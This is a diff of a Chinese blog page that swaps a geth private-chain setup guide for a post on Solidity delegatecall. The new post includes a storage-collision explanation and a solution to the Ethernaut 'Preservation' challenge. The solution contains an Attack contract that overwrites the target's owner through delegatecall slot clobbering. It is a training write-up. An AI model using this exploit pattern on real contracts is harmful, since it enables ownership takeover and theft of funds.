@@ -16,21 +16,21 @@
   <meta name="author" content="xiaocai">
   <meta name="keywords" content="">
   
-    <meta name="description" content="1.下载客户端在下载geth时，要注意版本不要太高，最新版本的geth不支持搭建私链。 这里是11.6版本。 2.准备创世块的配置文件123456789101112131415161718192021&amp;#123;  &quot;config&quot;: &amp;#123;        &quot;chainId&quot;: 10,        &quot;homesteadBlock&quot;">
+    <meta name="description" content="原理三种调用函数在 Solidity 中，call 函数簇可以实现跨合约的函数调用功能，其中包括 call、delegatecall 和 callcode 三种方式。 1234&lt;address&gt;.call(...) returns (bool)&lt;address&gt;.callcode(...) returns (bool)&lt;address&gt;.delegatecall">
 <meta property="og:type" content="article">
-<meta property="og:title" content="GETH 搭建私链">
-<meta property="og:url" content="http://xiaoxiaoxiaoxiaocai.github.io.com/2023/10/24/GETH-%E6%90%AD%E5%BB%BA%E7%A7%81%E9%93%BE/index.html">
+<meta property="og:title" content="Delegatecall">
+<meta property="og:url" content="http://xiaoxiaoxiaoxiaocai.github.io.com/2023/10/26/Delegatecall/index.html">
 <meta property="og:site_name" content="xiaocai">
-<meta property="og:description" content="1.下载客户端在下载geth时，要注意版本不要太高，最新版本的geth不支持搭建私链。 这里是11.6版本。 2.准备创世块的配置文件123456789101112131415161718192021&amp;#123;  &quot;config&quot;: &amp;#123;        &quot;chainId&quot;: 10,        &quot;homesteadBlock&quot;">
+<meta property="og:description" content="原理三种调用函数在 Solidity 中，call 函数簇可以实现跨合约的函数调用功能，其中包括 call、delegatecall 和 callcode 三种方式。 1234&lt;address&gt;.call(...) returns (bool)&lt;address&gt;.callcode(...) returns (bool)&lt;address&gt;.delegatecall">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-10-24T08:49:14.000Z">
-<meta property="article:modified_time" content="2023-10-30T07:14:40.057Z">
+<meta property="article:published_time" content="2023-10-26T03:27:24.000Z">
+<meta property="article:modified_time" content="2023-10-30T10:32:53.617Z">
 <meta property="article:author" content="xiaocai">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>GETH 搭建私链 - xiaocai</title>
+  <title>Delegatecall - xiaocai</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -196,7 +196,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="GETH 搭建私链"></span>
+            <span id="subtitle" data-typed-text="Delegatecall"></span>
           
         </div>
 
@@ -207,8 +207,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-10-24 16:49" pubdate>
-          October 24, 2023 pm
+        <time datetime="2023-10-26 11:27" pubdate>
+          October 26, 2023 am
         </time>
       </span>
     
@@ -219,7 +219,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.8k words
+          3.8k words
         
       </span>
     
@@ -230,7 +230,7 @@
         
         
         
-          16 mins
+          32 mins
         
       </span>
     
@@ -267,32 +267,35 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">GETH 搭建私链</h1>
+            <h1 id="seo-header">Delegatecall</h1>
             
             
               <div class="markdown-body">
                 
-                <h3 id="1-下载客户端"><a href="#1-下载客户端" class="headerlink" title="1.下载客户端"></a>1.下载客户端</h3><p>在下载geth时，要注意版本不要太高，最新版本的geth不支持搭建私链。</p>
-<p>这里是11.6版本。</p>
-<h3 id="2-准备创世块的配置文件"><a href="#2-准备创世块的配置文件" class="headerlink" title="2.准备创世块的配置文件"></a>2.准备创世块的配置文件</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;config&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;chainId&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;homesteadBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>		<span class="hljs-attr">&quot;byzantiumBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    	<span class="hljs-attr">&quot;constantinopleBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;eip155Block&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;eip158Block&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>		<span class="hljs-attr">&quot;eip150Block&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>  		<span class="hljs-attr">&quot;eip150Hash&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><br>	<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;coinbase&quot;</span>   <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;difficulty&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x20000&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;extraData&quot;</span>  <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;gasLimit&quot;</span>   <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0xffffffff&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;nonce&quot;</span>      <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000042&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;mixhash&quot;</span>    <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;parentHash&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;timestamp&quot;</span>  <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x00&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;alloc&quot;</span>      <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+                <h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="三种调用函数"><a href="#三种调用函数" class="headerlink" title="三种调用函数"></a>三种调用函数</h4><p>在 Solidity 中，call 函数簇可以实现跨合约的函数调用功能，其中包括 call、delegatecall 和 callcode 三种方式。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">&lt;address&gt;.call(...) returns (bool)<br>&lt;address&gt;.callcode(...) returns (bool)<br>&lt;address&gt;.delegatecall(...) returns (bool)<br><br></code></pre></td></tr></table></figure>
 
-<h3 id="3-初始化写入创世区块"><a href="#3-初始化写入创世区块" class="headerlink" title="3.初始化写入创世区块"></a>3.初始化写入创世区块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs geth">geth init --datadir data1 genesis.json<br></code></pre></td></tr></table></figure>
+<p>中的内置变量 <code>msg</code> 会随着调用的发起而改变，<code>msg</code> 保存了调用方的信息包括：调用发起的地址，交易金额，被调用函数字符序列等。</p>
+<h5 id="异同点"><a href="#异同点" class="headerlink" title="异同点"></a>异同点</h5><p>call ：调用后会将msg的值修改为调用者，执行环境为被调用的运行环境</p>
+<p>delegatecall: 调用后内置变量 <code>msg</code> 的值不会修改为调用者，但执行环境为调用者的运行环境（相当于复制被调用者的代码到调用者合约）</p>
+<p>callcode: 调用后内置变量 <code>msg</code> 的值会修改为调用者，但执行环境为调用者的运行环境</p>
+<h3 id="delegatecall的滥用"><a href="#delegatecall的滥用" class="headerlink" title="delegatecall的滥用"></a>delegatecall的滥用</h3><h4 id="威胁分析"><a href="#威胁分析" class="headerlink" title="威胁分析"></a>威胁分析</h4><p>delegatecall 调用有 <code>address</code> 和 <code>msg.data</code> 两个参数</p>
+<p> 若 <code>msg.data</code> 可控，则可调用 <code>address</code> 处任意函数</p>
+<h4 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.23;<br><br>contract A &#123;<br>    address public c;<br>    address public b;<br><br>    function test() public returns (address a) &#123;<br>        a = address(this);<br>        b = a;<br>    &#125;<br>&#125;<br><br>contract B &#123;<br>    address public b;<br>    address public c;<br><br>    function withdelegatecall(address testaddress) public &#123;<br>        testaddress.delegatecall(bytes4(keccak256(&quot;test()&quot;)));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
 
-<h3 id="4-启动geth"><a href="#4-启动geth" class="headerlink" title="4.启动geth"></a>4.启动geth</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">geth --datadir data1 --networkid <span class="hljs-number">10</span> --http --http.<span class="hljs-property">addr</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> --http.<span class="hljs-property">port</span> <span class="hljs-number">8545</span> --http.<span class="hljs-property">corsdomain</span> <span class="hljs-string">&quot;*&quot;</span> --http.<span class="hljs-property">api</span> <span class="hljs-string">&quot;db,eth,net,web3,personal,web3&quot;</span> --port <span class="hljs-number">30305</span> -allow-insecure-unlock <span class="hljs-variable language_">console</span> <span class="hljs-number">2</span>&gt;&gt;geth.<span class="hljs-property">log</span><br></code></pre></td></tr></table></figure>
+<p>当部署两个合约后，使用外部账户调用withdelegatecall函数。</p>
+<p>A合约中，c&#x3D;0；b&#x3D;0；</p>
+<p>B合约中，b&#x3D;0；c&#x3D;address (A)</p>
+<p>事实上调用 delegatecall 来使用 Storage 变量时依据并不是变量名，而是变量的存储位，这样的话我们就可以达到覆盖相关变量的目的。</p>
+<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="ethernaut-第-16-题"><a href="#ethernaut-第-16-题" class="headerlink" title="ethernaut 第 16 题"></a><a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/">ethernaut</a> 第 16 题</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>contract Preservation &#123;<br><br>  // public library contracts <br>  address public timeZone1Library;<br>  address public timeZone2Library;<br>  address public owner; <br>  uint storedTime;<br>  // Sets the function signature for delegatecall<br>  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));<br><br>  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;<br>    timeZone1Library = _timeZone1LibraryAddress; <br>    timeZone2Library = _timeZone2LibraryAddress; <br>    owner = msg.sender;<br>  &#125;<br><br>  // set the time for timezone 1<br>  function setFirstTime(uint _timeStamp) public &#123;<br>    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);<br>  &#125;<br><br>  // set the time for timezone 2<br>  function setSecondTime(uint _timeStamp) public &#123;<br>    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);<br>  &#125;<br>&#125;<br><br>// Simple library contract to set the time<br>contract LibraryContract &#123;<br><br>  // stores a timestamp <br>  uint storedTime;  <br><br>  function setTime(uint _time) public &#123;<br>    storedTime = _time;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<ol>
-<li><strong>.&#x2F;geth</strong>：这是执行 Geth 客户端的命令。</li>
-<li><strong>–datadir data1</strong>：这个选项指定了数据目录的路径，Geth 将在这个目录中存储区块链数据和相关文件。</li>
-<li><strong>–networkid 10</strong>：指定私有链的网络标识符，这个值用于在不同私有链之间进行区分。</li>
-<li><strong>–http</strong>：启用 HTTP-RPC 通信接口，允许通过 HTTP 请求与 Geth 进行交互。</li>
-<li><strong>–http.addr 0.0.0.0</strong>：设置 HTTP-RPC 服务监听的地址，0.0.0.0 表示允许来自任何 IP 地址的连接。</li>
-<li><strong>–http.port 8545</strong>：指定 HTTP-RPC 服务的端口号，一般是 8545。</li>
-<li>**–http.corsdomain “*“*<em>：配置允许跨域请求的域名，设置为 “</em>“ 表示允许任何域名进行跨域请求。</li>
-<li>**–http.api “db,eth,net,web3,personal,web3”**：指定启用的 HTTP-RPC 接口，这里列出了一些常用的接口，包括数据库、以太坊操作、网络信息、Web3 功能和个人账户操作。</li>
-<li><strong>–port 30305</strong>：设置 Geth 节点的 P2P 网络端口，用于节点间的通信。</li>
-<li><strong>-allow-insecure-unlock</strong>：允许以不安全的方式解锁账户。这在测试环境中使用，允许在 HTTP-RPC 上发送解锁账户的请求，但在生产环境中不建议使用</li>
-</ol>
-<h3 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h3><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv25915543/">一步步教程：使用Geth在本地搭建私有以太坊区块链 - 哔哩哔哩 (bilibili.com)</a></p>
+<h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>要想改变owner，只有constructor函数，但是有delegatecall漏洞。</p>
+<p>setFirstTime(uint _timeStamp) </p>
+<p>setSecondTime(uint _timeStamp)</p>
+<p>这两个函数是调用setTime函数。也就是说，当我们第一次调用setFirstTime函数时，就会设置solt0为攻击合约的地址，第二次调用该函数时就会调用该合约的函数即，改变的是solt2。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>contract Preservation &#123;<br><br>  // public library contracts <br>  address public timeZone1Library;<br>  address public timeZone2Library;<br>  address public owner; <br>  uint storedTime;<br>  // Sets the function signature for delegatecall<br>  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));<br><br>  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;<br>    timeZone1Library = _timeZone1LibraryAddress; <br>    timeZone2Library = _timeZone2LibraryAddress; <br>    owner = msg.sender;<br>  &#125;<br><br>  // set the time for timezone 1<br>  function setFirstTime(uint _timeStamp) public &#123;<br>    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);<br>  &#125;<br><br>  // set the time for timezone 2<br>  function setSecondTime(uint _timeStamp) public &#123;<br>    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);<br>  &#125;<br>&#125;<br><br>// Simple library contract to set the time<br>contract LibraryContract &#123;<br><br>  // stores a timestamp <br>  uint storedTime;  <br><br>  function setTime(uint _time) public &#123;<br>    storedTime = _time;<br>  &#125;<br>&#125;<br><br>contract Attack &#123;<br>  address public timeZone1Library;<br>  address public timeZone2Library;<br>  address public owner; <br>  uint storedTime;<br>  Preservation public target; // target Preservation contract<br><br>  constructor(address _target) public &#123;<br>    target = Preservation(_target);<br>  &#125;<br><br>  function attack1() public &#123;<br>    target.setFirstTime(uint256(uint160(address(this))));<br>    target.setFirstTime(uint256(uint160(msg.sender)));<br>  &#125;<br><br>  // overwrite the library addresses and owner address<br>  function setTime(uint _time) public &#123;<br>   owner=address(uint160(_time));<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>调用attack1().</p>
 
                 
               </div>
@@ -331,8 +334,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>GETH 搭建私链</div>
-      <div>http://xiaoxiaoxiaoxiaocai.github.io.com/2023/10/24/GETH-搭建私链/</div>
+      <div>Delegatecall</div>
+      <div>http://xiaoxiaoxiaoxiaocai.github.io.com/2023/10/26/Delegatecall/</div>
     </div>
     <div class="license-meta">
       
@@ -344,7 +347,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>October 24, 2023</div>
+          <div>October 26, 2023</div>
         </div>
       
       
@@ -376,18 +379,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/10/25/Pyjail%E4%B8%8A/" title="Pyjail（上）">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Pyjail（上）</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/10/24/Airdrop-Hunting/" title="Airdrop Hunting">
-                        <span class="hidden-mobile">Airdrop Hunting</span>
+                      <a href="/2023/10/25/Pyjail%E4%B8%8A/" title="Pyjail（上）">
+                        <span class="hidden-mobile">Pyjail（上）</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
